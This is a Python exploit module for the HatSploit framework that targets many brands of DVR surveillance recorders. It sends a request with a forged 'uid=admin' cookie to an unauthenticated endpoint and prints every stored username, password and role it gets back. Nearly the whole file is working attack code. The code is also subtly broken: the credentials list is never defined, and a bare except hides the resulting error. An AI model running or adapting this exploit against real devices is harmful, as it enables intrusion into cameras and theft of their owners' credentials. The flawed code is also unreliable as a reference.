#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import json

from core.lib.module import Module
from utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "DVR Multi Credentials Disclosure",
        'Module': "exploit/unix/multi/dvr_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080)',
            'ezelf'
        ],
        'Description': "Multiple DVR devices credentials disclosure.",
        'Comments': [
            'TBK DVR4104',
            'DVR4216',
            'Novo',
            'CeNova',
            'QSee',
            'Pulnix',
            'XVR 5 in 1',
            'Securus',
            'Night OWL',
            'DVR Login',
            'HVR Login',
            'MDVR Login'
        ],
        'Platform': "unix",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/device.rsp?opt=user&cmd=list',
            cookies={
                "uid": "admin"
            }
        )

        try:
            json_data = json.loads(response.text)
            for data in json_data["list"]:
                credentials.append((data["uid"], data["pwd"], data["role"]))

            self.print_table("Credentials", ('Username', 'Password', 'Role'), *credentials)
        except Exception:
            self.output_error("Credentials could not be found!")

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/device.rsp?opt=user&cmd=list'
        )

        if not response or response.status_code != 200:
            self.output_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")

        if not self.check(remote_host, remote_port):
            self.output_error("Exploit failed!")
            return

        self.exploit(remote_host, remote_port)
